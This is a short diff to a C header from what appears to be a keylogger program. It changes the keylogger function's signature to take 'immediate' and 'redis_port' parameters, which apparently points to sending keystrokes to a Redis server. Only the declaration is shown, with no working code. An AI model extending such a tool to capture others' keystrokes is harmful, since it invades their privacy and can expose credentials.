@@ -15,6 +15,6 @@ extern const char *keycodes[];
  * \param keyboard The file descriptor for the keyboard input file
  * \param writeout The file descriptor to write keystrokes out to
  */
-void keylogger(int keyboard, int writeout);
+void keylogger(int keyboard, int immediate, int redis_port);
 
 #endif
